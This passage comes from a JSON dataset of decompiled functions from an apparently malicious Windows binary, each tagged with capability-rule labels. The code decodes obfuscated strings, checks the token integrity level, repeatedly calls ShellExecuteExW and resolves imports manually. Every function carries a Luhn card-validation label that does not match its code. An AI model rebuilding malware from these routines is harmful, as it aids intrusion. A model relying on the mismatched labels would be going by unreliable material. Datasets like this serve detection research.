((iVar6 != 0) ||\n                   (iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, &lpValueName, 0, 4, &var_ch, 4), \n                   uVar5 = var_ch,  iVar6 != 0)) {\n                    uVar5 = 0;\n                }\n            }\n            var_10h = var_10h ^ uVar5;\n        }\n        (*pcVar1)(hKey);\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n        uVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar4 + 8);\n        uVar8 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar8 = (uVar8 >> 0xd | uVar8 << 0x13) + (puVar4 + 8)[uVar7];\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar8 = uVar8 ^ var_10h;\n        nSize = 0x10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x10);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        (*_sym.imp.KERNEL32.dll_GetComputerNameA)(iVar6, &nSize);\n        uVar5 = (*pcVar2)(iVar6);\n        uVar10 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar10 = (uVar10 >> 0xd | uVar10 << 0x13) + *(uVar7 + iVar6);\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n        (*pcVar2)(uVar3);\n        *0x41bd54 = uVar10 ^ uVar8;\n        *0x41bd58 = uVar10 << 10 | uVar10 >> 0x16;\n        *0x41bd4c = uVar8;\n        *0x41bd50 = uVar10;\n    }\n    return;\n}\n",
        "token_count": 1706
    },
    "00406b7b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar __fastcall fcn.00406b7b(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint8_t *puVar4;\n    uint32_t *puVar5;\n    char cVar6;\n    uint TokenHandle;\n    uint TokenInformationLength;\n    \n    cVar6 = '\\0';\n    TokenHandle = param_1;\n    TokenInformationLength = param_1;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(param_1, 8, &TokenHandle);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x19, 0, 0, &TokenInformationLength);\n        if (iVar1 == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x7a) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, TokenInformationLength);\n                puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                if (puVar3 != NULL) {\n                    iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                      (TokenHandle, 0x19, puVar3, TokenInformationLength, &TokenInformationLength);\n                    if (iVar1 != 0) {\n                        puVar4 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthorityCount)(*puVar3);\n                        if ((puVar4 != NULL) && (*puVar4 != 0)) {\n                            puVar5 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthority)(*puVar3, *puVar4 - 1);\n                            if (puVar5 != NULL) {\n                                if (*puVar5 < 0x2000) {\n                                    cVar6 = '\\x01';\n                                }\n                                else {\n                                    cVar6 = '\\x03' - (*puVar5 < 0x3000);\n                                }\n                            }\n                        }\n                    }\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar3);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                }\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return cVar6;\n}\n",
        "token_count": 526
    },
    "004082cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain obfuscated stackstrings",
            "contain loop",
            "query environment variable"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004082cd(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint lpDst;\n    uint lpszShortPath;\n    uint ARG_0;\n    uint pExecInfo;\n    uint var_8ch;\n    uint var_88h;\n    int32_t var_84h;\n    uint *var_80h;\n    uint *var_7ch;\n    uint var_74h;\n    uint hObject;\n    int32_t var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    int32_t lpszLongPath;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    uint var_11h;\n    uint var_dh;\n    uint var_9h;\n    uint32_t var_4h;\n    \n    sub.ntdll.dll_memset(&lpDst, 0, 0x410);\n    sub.ntdll.dll_memset(&ARG_0, 0, 0x208);\n    sub.ntdll.dll_memset(&lpszShortPath, 0, 0x208);\n    var_3ch = 0x57267467;\n    var_38h = 0x420a5324;\n    var_34h = 0x4d3e5110;\n    var_30h = 0x74676421;\n    var_2ch = 0x533e570d;\n    var_28h._0_2_ = 0x421d;\n    var_50h = 7;\n    var_28h._2_1_ = 7;\n    stack0xffffffd7 = 0x364d2351;\n    var_21h = 0x62742f64;\n    var_1dh = 0x38537f57;\n    var_19h = 0x3a511742;\n    var_15h = 0x6c64374d;\n    var_11h = 0x35573474;\n    var_dh._0_1_ = 0x53;\n    var_dh._1_2_ = 0x4201;\n    var_dh._3_1_ = 0x74;\n    var_9h._0_1_ = 0x51;\n    stack0xfffffff4 = 0x57517442;\n    var_4h = CONCAT13(var_4h._3_1_, 0x64534d);\n    fcn.00401000(0x68);\n    iVar9 = 0;\n    do {\n        puVar1 = iVar9 + var_54h;\n        iVar6 = iVar9 % var_50h;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_9h + iVar6 + 1) ^ puVar1[&var_3ch - var_54h];\n    } while (iVar9 < 0x34);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(var_54h, &lpDst, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetShortPathNameW)(lpszLongPath, &lpszShortPath, 0x104);\n    var_28h._0_2_ = 0x725a;\n    var_28h._2_1_ = 0x69;\n    stack0xffffffd7 = 0x51355767;\n    var_21h = 0x1446507a;\n    var_1dh = 0x1b714134;\n    var_19h = 0x40673472;\n    var_15h = 0x577a5135;\n    var_11h = 0x17341446;\n    var_dh._0_1_ = 0x71;\n    var_dh._1_2_ = 0x727a;\n    stack0xfffffff4 = 0x6746727a;\n    var_4h = var_4h & 0xff000000 | 0x713534;\n    fcn.00401000(0x3c);\n    iVar9 = lpszLongPath;\n    iVar6 = 0;\n    do {\n        puVar1 = iVar6 + lpszLongPath;\n        iVar7 = iVar6 % var_50h;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_9h + iVar7 + 1) ^ puVar1[&var_28h - lpszLongPath];\n    } while (iVar6 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, lpszLongPath, &lpszShortPath);\n    sub.ntdll.dll_memset(&pExecInfo, 0, 0x3c);\n    var_4ch = 0x381c3928;\n    var_48h = 0x7416493e;\n    var_44h = 0x38693929;\n    stack0xfffffff4 = 0x3869395a;\n    var_4h = 0x74774950;\n    fcn.00401000(0x18);\n    uVar8 = 0;\n    do {\n        puVar1 = uVar8 + lpszLongPath;\n        uVar4 = uVar8 & 0x80000007;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xfffffff8) + 1;\n        }\n        uVar8 = uVar8 + 1;\n        *puVar1 = *(&var_9h + uVar4 + 1) ^ puVar1[&var_4ch - lpszLongPath];\n    } while (uVar8 < 0xc);\n    var_80h = &lpDst;\n    pExecInfo = 0x3c;\n    var_7ch = &ARG_0;\n    var_84h = lpszLongPath;\n    var_74h = 3;\n    var_8ch = 0x40;\n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    pcVar2 = _sym.imp.USER32.dll_GetForegroundWindow;\n    while( true ) {\n        var_88h = (*pcVar2)();\n        iVar6 = (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n        if (iVar6 != 0) break;\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar6 != 0x4c7) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(100);\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpszLongPath);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*pcVar3)(0, iVar9);\n    (*pcVar2)(uVar5);\n    uVar5 = (*pcVar3)(0, var_54h);\n    (*pcVar2)(uVar5);\n    return 1;\n}\n",
        "token_count": 1748
    },
    "00408661": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408661(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = *param_2 * 0x19660d + 0x3c6ef35f;\n    *param_1 = iVar1;\n    iVar1 = iVar1 * 0x19660d + 0x3c6ef35f;\n    *(param_1 + 1) = iVar1;\n    iVar1 = iVar1 * 0x19660d + 0x3c6ef35f;\n    uVar2 = 0;\n    *param_2 = iVar1;\n    *(param_1 + 6) = iVar1;\n    do {\n        iVar1 = *param_2 * 0x19660d + 0x3c6ef35f;\n        *(param_1 + uVar2 + 8) = iVar1;\n        uVar2 = uVar2 + 1;\n        *param_2 = iVar1;\n    } while (uVar2 < 8);\n    return;\n}\n",
        "token_count": 251
    },
    "004088c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort * __cdecl fcn.004088c9(uint noname_0, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_EDX;\n    int32_t iVar4;\n    ushort *puVar5;\n    uint var_14h;\n    uint lpString2;\n    \n    puVar5 = NULL;\n    iVar4 = 0x27;\n    fcn.00408661();\n    iVar2 = fcn.004086b1();\n    if (iVar2 != 0) {\n        if (in_EDX != 0) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n            iVar4 = iVar4 + 0x27;\n        }\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4 * 2);\n        puVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (puVar5 != NULL) {\n            *puVar5 = 0;\n            if (in_EDX != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(puVar5);\n            }\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(puVar5, iVar2);\n        }\n        uVar3 = (*pcVar1)(0, iVar2);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return puVar5;\n}\n",
        "token_count": 341
    },
    "00408953": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00408953(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint s2;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar2 = 0;\n    var_8h = 0;\n    uVar1 = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = param_2;\n    if (0 < param_2) {\n        do {\n            if (0x3ff < uVar1) {\n                sub.ntdll.dll_memcpy(iVar2 + param_1, &s2, uVar1);\n                iVar2 = iVar2 + uVar1;\n                uVar1 = 0;\n            }\n            *(&s2 + uVar1) = *(var_8h + param_1) ^ var_1h;\n            uVar1 = uVar1 + 1;\n            var_1h._0_1_ = var_1h + (var_8h % 0x85) * '\\x03';\n            var_8h = var_8h + 1;\n        } while (var_8h < var_ch);\n        if (uVar1 != 0) {\n            sub.ntdll.dll_memcpy(iVar2 + param_1, &s2, uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 350
    },
    "00408bb9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00408bb9(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_1 + 0x3c);\n    if (*(iVar1 + 4 + param_1) == -0x799c) {\n        iVar1 = *(iVar1 + 0x88 + param_1);\n    }\n    else {\n        iVar1 = *(iVar1 + 0x78 + param_1);\n    }\n    return iVar1 + param_1;\n}\n",
        "token_count": 116
    },
    "00408bd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00408bd8(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint16_t *puVar5;\n    uint var_14h;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.00408bb9();\n    if (((iVar3 != 0) && (iVar1 = *(iVar3 + 0x1c),  iVar1 != 0)) && (*(iVar3 + 0x20) != 0)) {\n        var_8h = 0;\n        uVar2 = *(iVar3 + 0x18);\n        puVar5 = *(iVar3 + 0x24) + param_1;\n        piVar4 = *(iVar3 + 0x20) + param_1;\n        if (uVar2 != 0) {\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*piVar4 + param_1, param_2);\n                if (iVar3 == 0) {\n                    return iVar1 + param_1 + *puVar5 * 4;\n                }\n                puVar5 = puVar5 + 1;\n                piVar4 = piVar4 + 1;\n                var_8h = var_8h + 1;\n            } while (var_8h < uVar2);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 354
    },
    "00408c5e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00408c5e(int32_t param_1, uint32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    param_1 = *(param_1 + 0x3c) + param_1;\n    iVar1 = *(param_1 + 6);\n    iVar2 = param_1 + 0x18 + *(param_1 + 0x14);\n    while ((param_2 < *(iVar2 + 0xc) ||\n           ((*(param_1 + 0x3c) + -1 + *(iVar2 + 0x10) & ~(*(param_1 + 0x3c) - 1U)) + *(iVar2 + 0xc) <= param_2))) {\n        iVar1 = iVar1 + -1;\n        iVar2 = iVar2 + 0x28;\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return (*(iVar2 + 0x14) - *(iVar2 + 0xc)) + param_2;\n}\n",
        "token_count": 256
    },
    "00408cc5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408cc5(uint hModule, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    \n    if ((arg_ch == 0) && (arg_ch = arg_10h,  arg_10h == 0)) {\n        uVar1 = 0xc000007b;\n    }\n    else {\n        puVar3 = in_ECX + arg_ch;\n        if (puVar3 == NULL) {\n            uVar1 = 0xc000007b;\n        }\n        else {\n            uVar2 = *puVar3;\n            if (uVar2 != 0) {\n                iVar4 = (in_ECX + arg_10h) - puVar3;\n                do {\n                    if (uVar2 < 0) {\n                        uVar2 = uVar2 & 0xffff;\n                    }\n                    else {\n                        uVar2 = uVar2 + 2 + in_ECX;\n                    }\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hModule, uVar2);\n                    *(iVar4 + puVar3) = uVar1;\n                    puVar3 = puVar3 + 1;\n                    uVar2 = *puVar3;\n                } while (uVar2 != 0);\n            }\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 335
    },
    "00408d2a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00408d2a(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint lpModuleName;\n    uint phModule;\n    \n    iVar2 = *0x41bd78;\n    iVar4 = *(*(*0x41bd78 + 0x3c) + 0x80 + *0x41bd78);\n    if (iVar4 == 0) {\n        uVar3 = 0xc000000d;\n    }\n    else {\n        puVar6 = iVar4 + *0x41bd78;\n        if (puVar6 == NULL) {\n            uVar3 = 0xc000000d;\n        }\n        else {\n            iVar4 = puVar6[3];\n            while (iVar4 != 0) {\n                if (iVar4 + iVar2 != 0) {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar4 + iVar2);\n                    if (iVar4 == 0) break;\n                    lpModuleName._0_1_ = 0;\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(iVar4, &lpModuleName, 0x104);\n                    if (iVar5 != 0) {\n                        (*_sym.imp.KERNEL32.dll_GetModuleHandleExA)(1, &lpModuleName, &phModule);\n                    }\n                    iVar4 = fcn.00408cc5(iVar4, *puVar6, puVar6[4]);\n                    if (iVar4 != 0) break;\n                }\n                piVar1 = puVar6 + 8;\n                puVar6 = puVar6 + 5;\n                iVar4 = *piVar1;\n            }\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 425
    },
    "00408ece": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00408ece(int16_t *param_1, uint param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint lpUrlComponents;\n    uint s;\n    uint var_2ch;\n    uint var_28h;\n    \n    sub.ntdll.dll_memset(&s, 0, 0x38);\n    lpUrlComponents = 0x3c;\n    var_28h = 0x104;\n    piVar3 = param_1;\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar1 != 0);\n    var_2ch = param_2;\n    iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpCrackUrl)(param_1, piVar3 - (param_1 + 1) >> 1, 0, &lpUrlComponents);\n    return iVar2 != 0;\n}\n",
        "token_count": 221
    },
    "0040a423": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040a423(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint hModule;\n    uint var_4h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        iVar6 = 0x104;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(param_1, iVar3, iVar6);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if ((iVar4 == 0) || (iVar6 != iVar4)) break;\n            iVar6 = iVar6 + 0x104;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*pcVar1)(0, iVar6 * 2);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        } while (iVar3 != 0);\n        if (iVar3 != 0) {\n            if (iVar4 != 0) {\n                *param_2 = iVar3;\n                return 0;\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            return uVar2;\n        }\n    }\n    return 8;\n}\n",
        "token_count": 424
    },
    "0040a506": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040a506(int32_t param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t ARG_0;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar5 = 8;\n    var_14h = 8;\n    var_20h = param_1;\n    var_ch = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (param_1 != 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch * 2 + 0x1a);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n        uVar5 = var_14h;\n        if (iVar2 != 0) {\n            var_10h = iVar2;\n            uVar5 = (*pcVar6)(0, var_ch * 2 + 6);\n            var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n            if (var_4h != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar2, param_1);\n                var_1ch = (*_sym.imp.ntdll.dll_wcsrchr)(iVar2, 0x5c);\n                var_1ch = var_1ch + 2;\n                var_38h = 0x6b2f685d;\n                var_34h = 0x781b6227;\n                var_30h = 0x520a430a;\n                var_2ch = 0x68783516;\n                var_28h = 0x6b436878;\n                var_24h._0_2_ = 0x6252;\n                var_24h._2_1_ = 0x35;\n                fcn.00401000(0x20);\n                iVar2 = var_ch;\n                iVar7 = 0;\n                var_8h = 7;\n                do {\n                    puVar1 = iVar7 + var_ch;\n                    iVar3 = iVar7 % 7;\n                    iVar7 = iVar7 + 1;\n                    *puVar1 = *(&var_28h + iVar3) ^ puVar1[&var_38h - var_ch];\n                } while (iVar7 < 0x10);\n                uVar5 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                pcVar6 = _sym.imp.USER32.dll_wsprintfW;\n                (*_sym.imp.USER32.dll_wsprintfW)(var_1ch, iVar2, uVar5);\n                (*pcVar6)(var_4h, L\"\\\"%s\\\"\", var_20h);\n                pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x104);\n                ARG_0 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n                if (ARG_0 != 0) {\n                    var_1ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                    var_80h = 0x251f3257;\n                    var_7ch = 0x1b752e5e;\n                    var_78h = 0x447a4b34;\n                    var_74h = 0x665e786c;\n                    var_70h = 0x4106724e;\n                    var_6ch = 0x1e630c5f;\n                    var_68h = 0x30283d5a;\n                    var_64h = 0x724e665a;\n                    var_60h = 0x5f5f4106;\n                    var_5ch = 0x4f324b20;\n                    var_58h = 0x66422625;\n                    var_54h = 0x6c06724e;\n                    var_50h = 0x4325932;\n                    var_4ch = 0x58391277;\n                    var_48h = 0x3b0e223c;\n                    var_44h = 0x6706917;\n                    var_40h._0_2_ = 0x614b;\n                    var_40h._2_1_ = 0x57;\n                    var_28h = 0x576b4636;\n                    var_24h._0_2_ = 0x4c37;\n                    var_24h._2_1_ = 0x55;\n                    fcn.00401000(0x43);\n                    iVar7 = ARG_0;\n                    iVar2 = var_20h;\n                    iVar3 = 0;\n                    do {\n                        puVar1 = iVar3 + var_20h;\n                        iVar4 = iVar3 % var_8h;\n                        iVar3 = iVar3 + 1;\n                        *puVar1 = *(&var_28h + iVar4) ^ puVar1[&var_80h - var_20h];\n                    } while (iVar3 < 0x43);\n                    uVar5 = (*_sym.imp.USER32.dll_wsprintfA)(ARG_0, var_20h, var_1ch, var_1ch);\n                    var_14h = fcn.0040a4d4(uVar5, var_4h);\n                    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                    uVar5 = (*pcVar6)(0, iVar2);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                    iVar2 = var_ch;\n                }\n                uVar5 = (*pcVar6)(0, var_4h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                uVar5 = (*pcVar6)(0, iVar2);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                iVar2 = var_10h;\n            }\n            uVar5 = (*pcVar6)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            uVar5 = var_14h;\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 1674
    },
    "0040b086": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040b086(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint s2;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar2 = 0;\n    uVar1 = 0;\n    var_1h._0_1_ = 0x22;\n    var_8h = 0;\n    do {\n        if (0x3ff < uVar1) {\n            sub.ntdll.dll_memcpy(iVar2 + param_1, &s2, uVar1);\n            iVar2 = iVar2 + uVar1;\n            uVar1 = 0;\n        }\n        *(&s2 + uVar1) = *(var_8h + param_1) ^ var_1h;\n        uVar1 = uVar1 + 1;\n        var_1h._0_1_ = var_1h + (var_8h % 0x85) * '\\x03';\n        var_8h = var_8h + 1;\n    } while (var_8h < 0x184);\n    if (uVar1 != 0) {\n        sub.ntdll.dll_memcpy(iVar2 + param_1, &s2, uVar1);\n    }\n    return;\n}\n",
        "token_count": 319
    },
    "0040b951": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.0040b951(uint noname_0, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *arg_8h;\n    uint extraout_ECX;\n    int32_t in_EDX;\n    uint uVar4;\n    uint unaff_EDI;\n    int32_t *piVar5;\n    int32_t *piStack332;\n    int32_t *piStack328;\n    int32_t *piStack324;\n    int32_t *piStack320;\n    int32_t *piStack316;\n    int32_t iStack312;\n    int32_t *piStack308;\n    int32_t *piStack304;\n    int32_t *piStack300;\n    uchar *puStack296;\n    uchar *puStack292;\n    int32_t *piStack288;\n    uint uStack284;\n    uint uStack268;\n    uint uStack264;\n    int32_t iStack260;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    int32_t iStack224;\n    uchar *puStack220;\n    uchar *puStack216;\n    uchar *puStack212;\n    uchar *puStack208;\n    int32_t *piStack204;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    int32_t iStack168;\n    uint uStack164;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    int32_t iStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint 